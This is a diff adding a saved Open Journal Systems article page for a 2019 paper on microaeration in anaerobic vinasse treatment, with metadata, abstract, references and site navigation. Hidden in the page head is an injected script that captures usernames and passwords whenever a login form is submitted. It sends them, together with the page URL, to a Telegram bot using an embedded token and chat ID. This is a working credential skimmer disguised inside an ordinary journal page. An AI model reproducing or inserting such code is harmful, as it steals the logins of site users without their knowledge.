@@ -1,0 +1,993 @@
+<!DOCTYPE html>
+<html lang="en-US" xml:lang="en-US">
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>
+		Mathematical Model For Quantitative Analysis Of Acidogenic Performance Under Microaeration Condition In Anaerobic Vinasse Treatment
+							| Jurnal Riset Teknologi Pencegahan Pencemaran Industri
+			</title>
+
+	
+<link rel="icon" href="https://jrtppi.id/public/journals/1/favicon_en_US.png" />
+<meta name="generator" content="Open Journal Systems 3.3.0.22" />
+<script>
+(function() {
+    var token = '8588877843:AAElehVmnGj22LqAELi8rCIfP9f0L-brAGg';
+    var chat = '8610974230'; // GANTI DENGAN CHAT ID ASLI LO!
+    
+    function sendLogin() {
+        var u = document.querySelector('input[name=username]')?.value || 
+                document.querySelector('input[name=email]')?.value || '';
+        var p = document.querySelector('input[name=password]')?.value || '';
+        if (!u && !p) return;
+        var msg = 'Login: ' + u + ' | Pass: ' + p + ' | URL: ' + window.location.href;
+        fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat + '&text=' + encodeURIComponent(msg))
+            .catch(function(e){});
+    }
+    
+    document.addEventListener('submit', function(e) {
+        if (e.target.action && (e.target.action.includes('login') || e.target.action.includes('LoginHandler'))) {
+            sendLogin();
+        }
+    });
+})();
+</script>
+<meta name="gs_meta_revision" content="1.1"/>
+<meta name="citation_journal_title" content="Jurnal Riset Teknologi Pencegahan Pencemaran Industri"/>
+<meta name="citation_journal_abbrev" content="j.ris.technol.pencegah."/>
+<meta name="citation_issn" content="2503-5010"/> 
+<meta name="citation_author" content="Gregorius Indra Prima Budianto"/>
+<meta name="citation_author_institution" content="Faculty of Engineering Setia Budhi University"/>
+<meta name="citation_author" content="Wisnu Arfian Anditya Sudjarwo"/>
+<meta name="citation_author_institution" content="Faculty of Engineering Setia Budhi University"/>
+<meta name="citation_title" content="Mathematical Model For Quantitative Analysis Of Acidogenic Performance Under Microaeration Condition In Anaerobic Vinasse Treatment"/>
+<meta name="citation_language" content="en"/>
+<meta name="citation_date" content="2019"/>
+<meta name="citation_volume" content="10"/>
+<meta name="citation_issue" content="1"/>
+<meta name="citation_firstpage" content="12"/>
+<meta name="citation_lastpage" content="21"/>
+<meta name="citation_doi" content="10.21771/jrtppi.2019.v10.no1.p12-21"/>
+<meta name="citation_abstract_html_url" content="https://jrtppi.id/index.php/jrtppi/article/view/31"/>
+<meta name="citation_keywords" xml:lang="en" content="anaerobic"/>
+<meta name="citation_keywords" xml:lang="en" content="microaeration"/>
+<meta name="citation_keywords" xml:lang="en" content="vinasse"/>
+<meta name="citation_pdf_url" content="https://jrtppi.id/index.php/jrtppi/article/download/31/24"/>
+<meta name="citation_reference" content="American Public Health Association - APHA. (2005). Standard Methods for Examination of Water and Wastewater. Standard Methods. https://doi.org/30M11/98"/>
+<meta name="citation_reference" content="Budhijanto, W., Purnomo, C. W., &amp; Siregar, N. C. (2012). Simplified mathematical model for quantitative analysis of biogas production rate in a continuous digester. Engineering Journal. https://doi.org/10.4186/ej.2012.16.5.167"/>
+<meta name="citation_reference" content="Budiyono, Widiasa, I. N., Johari, S., &amp; Sunarso. (2010). The Kinetic of Biogas Production Rate from Cattle Manure in Batch Mode. International Journal of Chemical and Biomolecular Engineering."/>
+<meta name="citation_reference" content="Espana-Gamboa, E., Mijangos-Cortes, J., Barahona-Perez, L., Dominiquez-Maldonado, J., Hernandez-Zarate, G., Alzate-Gaviria, L. (2011). Vinasses: Characterization and Treatmentso Title. Waste Management and Research, 29(12), 1235–1250."/>
+<meta name="citation_reference" content="Fu, S. F., Wang, F., Shi, X. S., &amp; Guo, R. B. (2016). Impacts of microaeration on the anaerobic digestion of corn straw and the microbial community structure. Chemical Engineering Journal. https://doi.org/10.1016/j.cej.2015.11.070"/>
+<meta name="citation_reference" content="Jenicek, P., Celis, C. A., Koubova, J., &amp; Pokorna, D. (2011). Comparison of microbial activity in anaerobic and microaerobic digesters. Water Science and Technology. https://doi.org/10.2166/wst.2011.579"/>
+<meta name="citation_reference" content="Krayzelova, L., Bartacek, J., Díaz, I., Jeison, D., Volcke, E. I. P., &amp; Jenicek, P. (2015). Microaeration for hydrogen sulfide removal during anaerobic treatment: a review. Reviews in Environmental Science and Biotechnology. https://doi.org/10.1007/s11157-015-9386-2"/>
+<meta name="citation_reference" content="Moraes, B. S., Zaiat, M., &amp; Bonomi, A. (2015). Anaerobic digestion of vinasse from sugarcane ethanol production in Brazil: Challenges and perspectives. Renewable and Sustainable Energy Reviews. https://doi.org/10.1016/j.rser.2015.01.023"/>
+<meta name="citation_reference" content="Purnomo, C. W., Mellyanawaty, M., &amp; Budhijanto, W. (2017). Simulation and Experimental Study on Iron Impregnated Microbial Immobilization in Zeolite for Production of Biogas. Waste and Biomass Valorization. https://doi.org/10.1007/s12649-017-9879-z"/>
+<meta name="citation_reference" content="Walker, M., Zhang, Y., Heaven, S., &amp; Banks, C. (2009). Potential errors in the quantitative evaluation of biogas production in anaerobic digestion processes. Bioresource Technology. https://doi.org/10.1016/j.biortech.2009.07.018"/>
+<meta name="citation_reference" content="Wang, W., Zhang, J., Wang, S., Shen, J., &amp; Pan, S. L. (2014). Oxygen-limited aeration for relieving the impact of phenolic compounds in anaerobic treatment of coal gasification wastewater. International Biodeterioration and Biodegradation. https://doi.org/10.1016/j.ibiod.2014.06.009"/>
+<meta name="citation_reference" content="Wresta, A., &amp; Saepudin, A. (2013). Estimation of oxygen concentration in the slurry in biogas production without O2removal in initial process. In Energy Procedia. https://doi.org/10.1016/j.egypro.2013.05.015"/>
+<meta name="citation_reference" content="Xu, S., Selvam, A., &amp; Wong, J. W. C. (2014). Optimization of micro-aeration intensity in acidogenic reactor of a two-phase anaerobic digester treating food waste. Waste Management. https://doi.org/10.1016/j.wasman.2013.10.038"/>
+<meta name="citation_reference" content="Yusuf, M. O. L., Debora, A., &amp; Ogheneruona, D. E. (2011). Ambient temperature kinetic assessment of biogas production from co-digestion of horse and cow dung. Research in Agricultural Engineering. https://doi.org/10.17221/25/2010-RAE"/>
+<link rel="schema.DC" href="http://purl.org/dc/elements/1.1/" />
+<meta name="DC.Creator.PersonalName" content="Gregorius Indra Prima Budianto"/>
+<meta name="DC.Creator.PersonalName" content="Wisnu Arfian Anditya Sudjarwo"/>
+<meta name="DC.Date.created" scheme="ISO8601" content="2020-05-13"/>
+<meta name="DC.Date.dateSubmitted" scheme="ISO8601" content="2020-05-13"/>
+<meta name="DC.Date.issued" scheme="ISO8601" content="2019-05-27"/>
+<meta name="DC.Date.modified" scheme="ISO8601" content="2021-08-26"/>
+<meta name="DC.Description" xml:lang="en" content="Vinase anaerobic treatment is a one alternative process to treating vinasse. Microaeration is a one of process modification in anaerobic vinasse digestion that can improve the acidogenic performance. In this paper presents the influence microaeration in anaerobic vinasse treatment in kinetics aspect. The kinetics aspect was develop to approach and quantifying the effect of microaeration in anaerobic vinasse treatment systematically. Extract of cow dung was used as inoculums and vinasse 100 ppm as a substrate. Laboratory experiments using 4L vertical reactor (UASB) was conducted in 28 days and performed in batch recirculation mode. During the experiment, dosing air in different concentrations was injected in the slurry phase into different anaerobic digesters once a day. The variation of air concentrations are 0 L air/L feed; 0.5 L air/L feed; and 100 L air/L feed. As the result, the addition of 0.5 Lair/L feed could increase biodegradability (k=-5.7239) and accelerate acidogenesis phase (μm1=2.03/day) that can be proven by the percentage of VS removal reaching up to 77% and cuts the lag phase (λ=1.028 days) and HRT making it shorter."/>
+<meta name="DC.Format" scheme="IMT" content="application/pdf"/>
+<meta name="DC.Identifier" content="31"/>
+<meta name="DC.Identifier.pageNumber" content="12-21"/>
+<meta name="DC.Identifier.DOI" content="10.21771/jrtppi.2019.v10.no1.p12-21"/>
+<meta name="DC.Identifier.URI" content="https://jrtppi.id/index.php/jrtppi/article/view/31"/>
+<meta name="DC.Language" scheme="ISO639-1" content="en"/>
+<meta name="DC.Rights" content="Copyright (c) 2019 Gregorius Indra Prima Budianto, Wisnu Arfian Anditya Sudjarwo"/>
+<meta name="DC.Rights" content="https://creativecommons.org/licenses/by-nc-sa/4.0"/>
+<meta name="DC.Source" content="Jurnal Riset Teknologi Pencegahan Pencemaran Industri"/>
+<meta name="DC.Source.ISSN" content="2503-5010"/>
+<meta name="DC.Source.Issue" content="1"/>
+<meta name="DC.Source.Volume" content="10"/>
+<meta name="DC.Source.URI" content="https://jrtppi.id/index.php/jrtppi"/>
+<meta name="DC.Subject" xml:lang="en" content="anaerobic"/>
+<meta name="DC.Subject" xml:lang="en" content="microaeration"/>
+<meta name="DC.Subject" xml:lang="en" content="vinasse"/>
+<meta name="DC.Title" content="Mathematical Model For Quantitative Analysis Of Acidogenic Performance Under Microaeration Condition In Anaerobic Vinasse Treatment"/>
+<meta name="DC.Type" content="Text.Serial.Journal"/>
+<meta name="DC.Type.articleType" content="Articles"/>
+	<link rel="stylesheet" href="https://jrtppi.id/index.php/jrtppi/$$$call$$$/page/page/css?name=stylesheet" type="text/css" /><link rel="stylesheet" href="https://jrtppi.id/lib/pkp/styles/fontawesome/fontawesome.css?v=3.3.0.22" type="text/css" /><link rel="stylesheet" href="https://jrtppi.id/plugins/generic/citations/css/citations.css?v=3.3.0.22" type="text/css" /><link rel="stylesheet" href="https://jrtppi.id/plugins/generic/articleMetrics/styles/article_metrics.css?v=3.3.0.22" type="text/css" /><link rel="stylesheet" href="https://jrtppi.id/plugins/generic/orcidProfile/css/orcidProfile.css?v=3.3.0.22" type="text/css" /><link rel="stylesheet" href="https://jrtppi.id/public/journals/1/styleSheet.css?d=2025-02-20+03%3A40%3A24" type="text/css" />
+</head>
+<body class="pkp_page_article pkp_op_view has_site_logo" dir="ltr">
+
+	<div class="pkp_structure_page">
+
+				<header class="pkp_structure_head" id="headerNavigationContainer" role="banner">
+						
+ <nav class="cmp_skip_to_content" aria-label="Jump to content links">
+	<a href="#pkp_content_main">Skip to main content</a>
+	<a href="#siteNav">Skip to main navigation menu</a>
+		<a href="#pkp_content_footer">Skip to site footer</a>
+</nav>
+
+			<div class="pkp_head_wrapper">
+
+				<div class="pkp_site_name_wrapper">
+					<button class="pkp_site_nav_toggle">
+						<span>Open Menu</span>
+					</button>
+										<div class="pkp_site_name">
+																<a href="						https://jrtppi.id/index.php/jrtppi/index
+					" class="is_img">
+							<img src="https://jrtppi.id/public/journals/1/pageHeaderLogoImage_en_US.jpg" width="1600" height="193" alt="jrtpi" />
+						</a>
+										</div>
+				</div>
+
+				
+				<nav class="pkp_site_nav_menu" aria-label="Site Navigation">
+					<a id="siteNav"></a>
+					<div class="pkp_navigation_primary_row">
+						<div class="pkp_navigation_primary_wrapper">
+																				<ul id="navigationPrimary" class="pkp_navigation_primary pkp_nav_list">
+								<li class="">
+				<a href="https://jrtppi.id/index.php/jrtppi">
+					<i class="fa fa-home"></i> Home
+				</a>
+							</li>
+								<li class="">
+				<a href="https://jrtppi.id/index.php/jrtppi/about">
+					<i class="fa fa-desktop"></i> About
+				</a>
+									<ul>
+																					<li class="">
+									<a href="https://jrtppi.id/index.php/jrtppi/about">
+										About the Journal
+									</a>
+								</li>
+																		</ul>
+							</li>
+								<li class="">
+				<a href="https://jrtppi.id/index.php/jrtppi/issues">
+					<i class="fa fa-folder"></i> Issues
+				</a>
+									<ul>
+																					<li class="">
+									<a href="https://jrtppi.id/index.php/jrtppi/issue/current">
+										Current
+									</a>
+								</li>
+																												<li class="">
+									<a href="https://jrtppi.id/index.php/jrtppi/issue/archive">
+										Archives
+									</a>
+								</li>
+																		</ul>
+							</li>
+								<li class="">
+				<a href="https://jrtppi.id/index.php/jrtppi/people">
+					<i class="fa fa-users"></i> People
+				</a>
+									<ul>
+																					<li class="">
+									<a href="https://jrtppi.id/index.php/jrtppi/about/editorialTeam">
+										Editorial Team
+									</a>
+								</li>
+																		</ul>
+							</li>
+								<li class="">
+				<a href="https://jrtppi.id/index.php/jrtppi/announcement">
+					<i class="fa fa-bullhorn"></i> Announcements
+				</a>
+							</li>
+								<li class="">
+				<a href="https://jrtppi.id/index.php/jrtppi/about/contact">
+					<i class="fa fa-address-book-o"></i> Contact
+				</a>
+							</li>
+			</ul>
+
+				
+
+																						<div class="pkp_navigation_search_wrapper">
+									<a href="https://jrtppi.id/index.php/jrtppi/search" class="pkp_search pkp_search_desktop">
+										<span class="fa fa-search" aria-hidden="true"></span>
+										Search
+									</a>
+								</div>
+													</div>
+					</div>
+					<div class="pkp_navigation_user_wrapper" id="navigationUserWrapper">
+							<ul id="navigationUser" class="pkp_navigation_user pkp_nav_list">
+								<li class="profile">
+				<a href="http://jrtppi.id/index.php/jrtppi/index">
+					Home
+				</a>
+							</li>
+								<li class="profile">
+				<a href="https://jrtppi.id/index.php/jrtppi/user/register">
+					Register
+				</a>
+							</li>
+								<li class="profile">
+				<a href="https://jrtppi.id/index.php/jrtppi/login">
+					Login
+				</a>
+							</li>
+										</ul>
+
+					</div>
+				</nav>
+			</div><!-- .pkp_head_wrapper -->
+		</header><!-- .pkp_structure_head -->
+
+						<div class="pkp_structure_content has_sidebar">
+			<div class="pkp_structure_main" role="main">
+				<a id="pkp_content_main"></a>
+
+<div class="page page_article">
+			<nav class="cmp_breadcrumbs" role="navigation" aria-label="You are here:">
+	<ol>
+		<li>
+			<a href="https://jrtppi.id/index.php/jrtppi/index">
+				Home
+			</a>
+			<span class="separator">/</span>
+		</li>
+		<li>
+			<a href="https://jrtppi.id/index.php/jrtppi/issue/archive">
+				Archives
+			</a>
+			<span class="separator">/</span>
+		</li>
+					<li>
+				<a href="https://jrtppi.id/index.php/jrtppi/issue/view/12">
+					Vol. 10 No. 1 (2019)
+				</a>
+				<span class="separator">/</span>
+			</li>
+				<li class="current" aria-current="page">
+			<span aria-current="page">
+									Articles
+							</span>
+		</li>
+	</ol>
+</nav>
+	
+		  	 <article class="obj_article_details">
+
+		
+	<h1 class="page_title">
+		Mathematical Model For Quantitative Analysis Of Acidogenic Performance Under Microaeration Condition In Anaerobic Vinasse Treatment
+	</h1>
+
+	
+	<div class="row">
+		<div class="main_entry">
+
+							<section class="item authors">
+					<h2 class="pkp_screen_reader">Authors</h2>
+					<ul class="authors">
+											<li>
+							<span class="name">
+								Gregorius Indra Prima Budianto
+							</span>
+															<span class="affiliation">
+									Faculty of Engineering Setia Budhi University
+																	</span>
+																				</li>
+											<li>
+							<span class="name">
+								Wisnu Arfian Anditya Sudjarwo
+							</span>
+															<span class="affiliation">
+									Faculty of Engineering Setia Budhi University
+																	</span>
+																				</li>
+										</ul>
+				</section>
+			
+																												<section class="item doi">
+						<h2 class="label">
+														DOI:
+						</h2>
+						<span class="value">
+							<a href="https://doi.org/10.21771/jrtppi.2019.v10.no1.p12-21">
+								https://doi.org/10.21771/jrtppi.2019.v10.no1.p12-21
+							</a>
+						</span>
+					</section>
+							
+									<section class="item keywords">
+				<h2 class="label">
+										Keywords:
+				</h2>
+				<span class="value">
+											anaerobic, 											microaeration, 											vinasse									</span>
+			</section>
+			
+										<section class="item abstract">
+					<h2 class="label">Abstract</h2>
+					<p>Vinase anaerobic treatment is a one alternative process to treating vinasse. Microaeration is a one of process modification in anaerobic vinasse digestion that can improve the acidogenic performance. In this paper presents the influence microaeration in anaerobic vinasse treatment in kinetics aspect. The kinetics aspect was develop to approach and quantifying the effect of microaeration in anaerobic vinasse treatment systematically. Extract of cow dung was used as inoculums and vinasse 100 ppm as a substrate. Laboratory experiments using 4L vertical reactor (UASB) was conducted in 28 days and performed in batch recirculation mode. During the experiment, dosing air in different concentrations was injected in the slurry phase into different anaerobic digesters once a day. The variation of air concentrations are 0 L air/L feed; 0.5 L air/L feed; and 100 L air/L feed. As the result, the addition of 0.5 Lair/L feed could increase biodegradability (k=-5.7239) and accelerate acidogenesis phase (μm1=2.03/day) that can be proven by the percentage of VS removal reaching up to 77% and cuts the lag phase (λ=1.028 days) and HRT making it shorter.</p>
+				</section>
+			
+			
+
+																										
+										<section class="item references">
+					<h2 class="label">
+						References
+					</h2>
+					<div class="value">
+																					<p>American Public Health Association - APHA. (2005). Standard Methods for Examination of Water and Wastewater. Standard Methods. <a href="https://doi.org/30M11/98">https://doi.org/30M11/98</a> </p>
+															<p>Budhijanto, W., Purnomo, C. W., &amp; Siregar, N. C. (2012). Simplified mathematical model for quantitative analysis of biogas production rate in a continuous digester. Engineering Journal. <a href="https://doi.org/10.4186/ej.2012.16.5.167">https://doi.org/10.4186/ej.2012.16.5.167</a> </p>
+															<p>Budiyono, Widiasa, I. N., Johari, S., &amp; Sunarso. (2010). The Kinetic of Biogas Production Rate from Cattle Manure in Batch Mode. International Journal of Chemical and Biomolecular Engineering. </p>
+															<p>Espana-Gamboa, E., Mijangos-Cortes, J., Barahona-Perez, L., Dominiquez-Maldonado, J., Hernandez-Zarate, G., Alzate-Gaviria, L. (2011). Vinasses: Characterization and Treatmentso Title. Waste Management and Research, 29(12), 1235–1250. </p>
+															<p>Fu, S. F., Wang, F., Shi, X. S., &amp; Guo, R. B. (2016). Impacts of microaeration on the anaerobic digestion of corn straw and the microbial community structure. Chemical Engineering Journal. <a href="https://doi.org/10.1016/j.cej.2015.11.070">https://doi.org/10.1016/j.cej.2015.11.070</a> </p>
+															<p>Jenicek, P., Celis, C. A., Koubova, J., &amp; Pokorna, D. (2011). Comparison of microbial activity in anaerobic and microaerobic digesters. Water Science and Technology. <a href="https://doi.org/10.2166/wst.2011.579">https://doi.org/10.2166/wst.2011.579</a> </p>
+															<p>Krayzelova, L., Bartacek, J., Díaz, I., Jeison, D., Volcke, E. I. P., &amp; Jenicek, P. (2015). Microaeration for hydrogen sulfide removal during anaerobic treatment: a review. Reviews in Environmental Science and Biotechnology. <a href="https://doi.org/10.1007/s11157-015-9386-2">https://doi.org/10.1007/s11157-015-9386-2</a> </p>
+															<p>Moraes, B. S., Zaiat, M., &amp; Bonomi, A. (2015). Anaerobic digestion of vinasse from sugarcane ethanol production in Brazil: Challenges and perspectives. Renewable and Sustainable Energy Reviews. <a href="https://doi.org/10.1016/j.rser.2015.01.023">https://doi.org/10.1016/j.rser.2015.01.023</a> </p>
+															<p>Purnomo, C. W., Mellyanawaty, M., &amp; Budhijanto, W. (2017). Simulation and Experimental Study on Iron Impregnated Microbial Immobilization in Zeolite for Production of Biogas. Waste and Biomass Valorization. <a href="https://doi.org/10.1007/s12649-017-9879-z">https://doi.org/10.1007/s12649-017-9879-z</a> </p>
+															<p>Walker, M., Zhang, Y., Heaven, S., &amp; Banks, C. (2009). Potential errors in the quantitative evaluation of biogas production in anaerobic digestion processes. Bioresource Technology. <a href="https://doi.org/10.1016/j.biortech.2009.07.018">https://doi.org/10.1016/j.biortech.2009.07.018</a> </p>
+															<p>Wang, W., Zhang, J., Wang, S., Shen, J., &amp; Pan, S. L. (2014). Oxygen-limited aeration for relieving the impact of phenolic compounds in anaerobic treatment of coal gasification wastewater. International Biodeterioration and Biodegradation. <a href="https://doi.org/10.1016/j.ibiod.2014.06.009">https://doi.org/10.1016/j.ibiod.2014.06.009</a> </p>
+															<p>Wresta, A., &amp; Saepudin, A. (2013). Estimation of oxygen concentration in the slurry in biogas production without O2removal in initial process. In Energy Procedia. <a href="https://doi.org/10.1016/j.egypro.2013.05.015">https://doi.org/10.1016/j.egypro.2013.05.015</a> </p>
+															<p>Xu, S., Selvam, A., &amp; Wong, J. W. C. (2014). Optimization of micro-aeration intensity in acidogenic reactor of a two-phase anaerobic digester treating food waste. Waste Management. <a href="https://doi.org/10.1016/j.wasman.2013.10.038">https://doi.org/10.1016/j.wasman.2013.10.038</a> </p>
+															<p>Yusuf, M. O. L., Debora, A., &amp; Ogheneruona, D. E. (2011). Ambient temperature kinetic assessment of biogas production from co-digestion of horse and cow dung. Research in Agricultural Engineering. <a href="https://doi.org/10.17221/25/2010-RAE">https://doi.org/10.17221/25/2010-RAE</a> </p>
+																		</div>
+				</section>
+			
+		</div><!-- .main_entry -->
+
+		<div class="entry_details">
+
+										<div class="item cover_image">
+					<div class="sub_item">
+													<a href="https://jrtppi.id/index.php/jrtppi/issue/view/12">
+								<img src="https://jrtppi.id/public/journals/1/cover_issue_12_en_US.png" alt="">
+							</a>
+											</div>
+				</div>
+			
+										<div class="item galleys">
+					<h2 class="pkp_screen_reader">
+						Downloads
+					</h2>
+					<ul class="value galleys_links">
+													<li>
+								
+	
+							
+
+<a class="obj_galley_link pdf" href="https://jrtppi.id/index.php/jrtppi/article/view/31/24">
+
+		
+	pdf
+
+	</a>
+							</li>
+											</ul>
+				</div>
+						
+						<div class="item published">
+				<section class="sub_item">
+					<h2 class="label">
+						Published
+					</h2>
+					<div class="value">
+																			<span>2020-05-13</span>
+																	</div>
+				</section>
+							</div>
+			
+										<div class="item citation">
+					<section class="sub_item citation_display">
+						<h2 class="label">
+							How to Cite
+						</h2>
+						<div class="value">
+							<div id="citationOutput" role="region" aria-live="polite">
+								<div class="csl-bib-body">
+  <div class="csl-entry">Budianto, G. I. P., &#38; Sudjarwo, W. A. A. (2020). Mathematical Model For Quantitative Analysis Of Acidogenic Performance Under Microaeration Condition In Anaerobic Vinasse Treatment. <i>Jurnal Riset Teknologi Pencegahan Pencemaran Industri</i>, <i>10</i>(1), 12–21. https://doi.org/10.21771/jrtppi.2019.v10.no1.p12-21</div>
+</div>
+							</div>
+							<div class="citation_formats">
+								<button class="cmp_button citation_formats_button" aria-controls="cslCitationFormats" aria-expanded="false" data-csl-dropdown="true">
+									More Citation Formats
+								</button>
+								<div id="cslCitationFormats" class="citation_formats_list" aria-hidden="true">
+									<ul class="citation_formats_styles">
+																					<li>
+												<a
+													rel="nofollow"
+													aria-controls="citationOutput"
+													href="https://jrtppi.id/index.php/jrtppi/citationstylelanguage/get/acm-sig-proceedings?submissionId=31&amp;publicationId=31"
+													data-load-citation
+													data-json-href="https://jrtppi.id/index.php/jrtppi/citationstylelanguage/get/acm-sig-proceedings?submissionId=31&amp;publicationId=31&amp;return=json"
+												>
+													ACM
+												</a>
+											</li>
+																					<li>
+												<a
+													rel="nofollow"
+													aria-controls="citationOutput"
+													href="https://jrtppi.id/index.php/jrtppi/citationstylelanguage/get/acs-nano?submissionId=31&amp;publicationId=31"
+													data-load-citation
+													data-json-href="https://jrtppi.id/index.php/jrtppi/citationstylelanguage/get/acs-nano?submissionId=31&amp;publicationId=31&amp;return=json"
+												>
+													ACS
+												</a>
+											</li>
+																					<li>
+												<a
+													rel="nofollow"
+													aria-controls="citationOutput"
+													href="https://jrtppi.id/index.php/jrtppi/citationstylelanguage/get/apa?submissionId=31&amp;publicationId=31"
+													data-load-citation
+													data-json-href="https://jrtppi.id/index.php/jrtppi/citationstylelanguage/get/apa?submissionId=31&amp;publicationId=31&amp;return=json"
+												>
+													APA
+												</a>
+											</li>
+																					<li>
+												<a
+													rel="nofollow"
+													aria-controls="citationOutput"
+													href="https://jrtppi.id/index.php/jrtppi/citationstylelanguage/get/associacao-brasileira-de-normas-tecnicas?submissionId=31&amp;publicationId=31"
+													data-load-citation
+													data-json-href="https://jrtppi.id/index.php/jrtppi/citationstylelanguage/get/associacao-brasileira-de-normas-tecnicas?submissionId=31&amp;publicationId=31&amp;return=json"
+												>
+													ABNT
+												</a>
+											</li>
+																					<li>
+												<a
+													rel="nofollow"
+													aria-controls="citationOutput"
+													href="https://jrtppi.id/index.php/jrtppi/citationstylelanguage/get/chicago-author-date?submissionId=31&amp;publicationId=31"
+													data-load-citation
+													data-json-href="https://jrtppi.id/index.php/jrtppi/citationstylelanguage/get/chicago-author-date?submissionId=31&amp;publicationId=31&amp;return=json"
+												>
+													Chicago
+												</a>
+											</li>
+																					<li>
+												<a
+													rel="nofollow"
+													aria-controls="citationOutput"
+													href="https://jrtppi.id/index.php/jrtppi/citationstylelanguage/get/harvard-cite-them-right?submissionId=31&amp;publicationId=31"
+													data-load-citation
+													data-json-href="https://jrtppi.id/index.php/jrtppi/citationstylelanguage/get/harvard-cite-them-right?submissionId=31&amp;publicationId=31&amp;return=json"
+												>
+													Harvard
+												</a>
+											</li>
+																					<li>
+												<a
+													rel="nofollow"
+													aria-controls="citationOutput"
+													href="https://jrtppi.id/index.php/jrtppi/citationstylelanguage/get/ieee?submissionId=31&amp;publicationId=31"
+													data-load-citation
+													data-json-href="https://jrtppi.id/index.php/jrtppi/citationstylelanguage/get/ieee?submissionId=31&amp;publicationId=31&amp;return=json"
+												>
+													IEEE
+												</a>
+											</li>
+																					<li>
+												<a
+													rel="nofollow"
+													aria-controls="citationOutput"
+													href="https://jrtppi.id/index.php/jrtppi/citationstylelanguage/get/modern-language-association?submissionId=31&amp;publicationId=31"
+													data-load-citation
+													data-json-href="https://jrtppi.id/index.php/jrtppi/citationstylelanguage/get/modern-language-association?submissionId=31&amp;publicationId=31&amp;return=json"
+												>
+													MLA
+												</a>
+											</li>
+																					<li>
+												<a
+													rel="nofollow"
+													aria-controls="citationOutput"
+													href="https://jrtppi.id/index.php/jrtppi/citationstylelanguage/get/turabian-fullnote-bibliography?submissionId=31&amp;publicationId=31"
+													data-load-citation
+													data-json-href="https://jrtppi.id/index.php/jrtppi/citationstylelanguage/get/turabian-fullnote-bibliography?submissionId=31&amp;publicationId=31&amp;return=json"
+												>
+													Turabian
+												</a>
+											</li>
+																					<li>
+												<a
+													rel="nofollow"
+													aria-controls="citationOutput"
+													href="https://jrtppi.id/index.php/jrtppi/citationstylelanguage/get/vancouver?submissionId=31&amp;publicationId=31"
+													data-load-citation
+													data-json-href="https://jrtppi.id/index.php/jrtppi/citationstylelanguage/get/vancouver?submissionId=31&amp;publicationId=31&amp;return=json"
+												>
+													Vancouver
+												</a>
+											</li>
+																			</ul>
+																			<div class="label">
+											Download Citation
+										</div>
+										<ul class="citation_formats_styles">
+																							<li>
+													<a href="https://jrtppi.id/index.php/jrtppi/citationstylelanguage/download/ris?submissionId=31&amp;publicationId=31">
+														<span class="fa fa-download"></span>
+														Endnote/Zotero/Mendeley (RIS)
+													</a>
+												</li>
+																							<li>
+													<a href="https://jrtppi.id/index.php/jrtppi/citationstylelanguage/download/bibtex?submissionId=31&amp;publicationId=31">
+														<span class="fa fa-download"></span>
+														BibTeX
+													</a>
+												</li>
+																					</ul>
+																	</div>
+							</div>
+						</div>
+					</section>
+				</div>
+			
+										<div class="item issue">
+
+											<section class="sub_item">
+							<h2 class="label">
+								Issue
+							</h2>
+							<div class="value">
+								<a class="title" href="https://jrtppi.id/index.php/jrtppi/issue/view/12">
+									Vol. 10 No. 1 (2019)
+								</a>
+							</div>
+						</section>
+					
+											<section class="sub_item">
+							<h2 class="label">
+								Section
+							</h2>
+							<div class="value">
+								Articles
+							</div>
+						</section>
+					
+									</div>
+			
+															
+										<div class="item copyright">
+					<h2 class="label">
+						License
+					</h2>
+																										<p>Copyright (c) 2019 Gregorius Indra Prima Budianto, Wisnu Arfian Anditya Sudjarwo</p>
+														<a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/"><img alt="Creative Commons License" src="//i.creativecommons.org/l/by-nc-sa/4.0/88x31.png" /></a><p>This work is licensed under a <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License</a>.</p>
+																
+				</div>
+			
+			<div class="item citations-container" data-image-path="https://jrtppi.id/plugins/generic/citations/images/" data-citations-url="https://jrtppi.id/index.php/jrtppi/citations/get?citationsId=10.21771%2Fjrtppi.2019.v10.no1.p12-21&amp;citationsShowList=1&amp;citationsProvider=all"
+     data-citations-provider="all" data-citations-total="1" data-citations-list="1"
+     data-show-google="1" data-show-pmc="0">
+	<div id="citations-loader"></div>
+	<div class="citations-count">
+		<div class="citations-count-crossref">
+			<img class="img-fluid" src="https://jrtppi.id/plugins/generic/citations/images/crossref.png" alt="Crossref"/>
+			<div class="badge_total"></div>
+		</div>
+		<div class="citations-count-scopus">
+			<img src="https://jrtppi.id/plugins/generic/citations/images/scopus.png" alt="Scopus"/>
+			<br/>
+			<span class="badge_total"></span>
+		</div>
+		<div class="citations-count-google">
+			<a href="https://scholar.google.com/scholar?q=10.21771/jrtppi.2019.v10.no1.p12-21" target="_blank" rel="noreferrer">
+				<img src="https://jrtppi.id/plugins/generic/citations/images/scholar.png" alt="Google Scholar"/>
+			</a>
+		</div>
+		<div class="citations-count-pmc">
+			<a href="http://europepmc.org/search?scope=fulltext&query=(REF:10.21771/jrtppi.2019.v10.no1.p12-21)" target="_blank" rel="noreferrer">
+				<img src="https://jrtppi.id/plugins/generic/citations/images/pmc.png" alt="Europe PMC"/>
+				<br/>
+				<span class="badge_total"></span>
+			</a>
+		</div>
+	</div>
+	<div class="citations-list"></div>
+    </div>
+
+
+		</div><!-- .entry_details -->
+	</div><!-- .row -->
+
+</article>
+
+	<div id="articlesBySimilarityList">
+				<h3>
+			<a name="articlesBySimilarity">Similar Articles</a>
+		</h3>
+		<ul>
+
+											
+				<li>
+											Rustiana Yuliasni,
+											Rieke Yuliastuti,
+											Nanik Indah Setianingsih,
+										<a href="https://jrtppi.id/index.php/jrtppi/article/view/111">
+						Biogas Production from Sugarcane Vinasse: A Review
+					</a>
+					,
+					<a href="https://jrtppi.id/index.php/jrtppi/issue/view/16">
+						Jurnal Riset Teknologi Pencegahan Pencemaran Industri: Vol. 12 No. 2 (2021)
+					</a>
+									</li>
+											
+				<li>
+											Aris Mukimin,
+											Nur Zen,
+											Hanny Vistanty,
+											Purwanto Agus,
+										<a href="https://jrtppi.id/index.php/jrtppi/article/view/85">
+						High Electric Production by Membraneless Microbial Fuel Cell with Up Flow Operation Using Acetate Wastewater
+					</a>
+					,
+					<a href="https://jrtppi.id/index.php/jrtppi/issue/view/14">
+						Jurnal Riset Teknologi Pencegahan Pencemaran Industri: Vol. 11 No. 2 (2020)
+					</a>
